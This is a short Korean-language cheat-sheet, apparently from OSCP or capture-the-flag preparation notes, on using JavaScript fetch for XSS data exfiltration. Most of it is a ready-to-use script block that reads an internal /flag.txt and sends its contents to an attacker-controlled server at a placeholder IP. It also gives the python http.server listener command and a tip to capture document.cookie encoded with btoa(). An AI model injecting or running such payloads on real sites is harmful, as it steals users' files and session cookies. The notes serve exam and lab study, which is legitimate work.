# javascript fetch

> 무엇: Promise 기반 Web API인 fetch로 피해자 브라우저가 내부 리소스(예: /flag.txt)를 읽어 encodeURIComponent로 붙여 공격자 서버로 전송하게 만드는 스크립트 정리다(XSS 데이터 유출).
> 언제: XSS·스크립트 삽입 지점을 확보했을 때 플래그 파일이나 쿠키(document.cookie는 btoa() 인코딩) 같은 내부 데이터를 외부로 빼낼 때 쓴다.
> 조건: 공격자 서버(`python3 -m http.server 8000`)가 떠 있어야 하고 스크립트가 실행될 브라우저가 필요하다. URL에는 브라우저가 도달 가능한 공격자 IP를 적고, 성공 기준은 공격자 서버 로그에 요청이 도달하는 것이다.

## 개요

`fetch`는 XMLHttpRequest 대신 쓸 수 있는 Promise 기반의 Web API다. OSCP 웹 공격 단계에서, "공격자 서버로 요청을 보내는" 스크립트를 만들 때 주로 쓰인다.

## 스크립트

```html
<script>
  fetch('http://127.0.0.1:8000/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<공격자_IP>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

- 첫 `fetch`는 내부 리소스(플래그 파일)를 요청한다.
- 두 번째 `fetch`가 결과를 공격자 서버로 전송한다.
- `encodeURIComponent`로 예약어/특수문자를 안전하게 인코딩한다.

## 실행

```bash
# 공격자 서버를 서빌린다
python3 -m http.server 8000
```

- 브라우저가 로드하는 URL을 공격자 PC의 IP로 적는다.
- 서버 로그에서 요청 경로와 파라미터를 확인한다.

## 확인 사항

- 요청이 공격자 서버로 도달했는지가 성공의 기준이다(화면에 결과가 보이지 않아도 된다).
- `document.cookie`를 수집할 때는 `btoa()`로 인코딩한다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
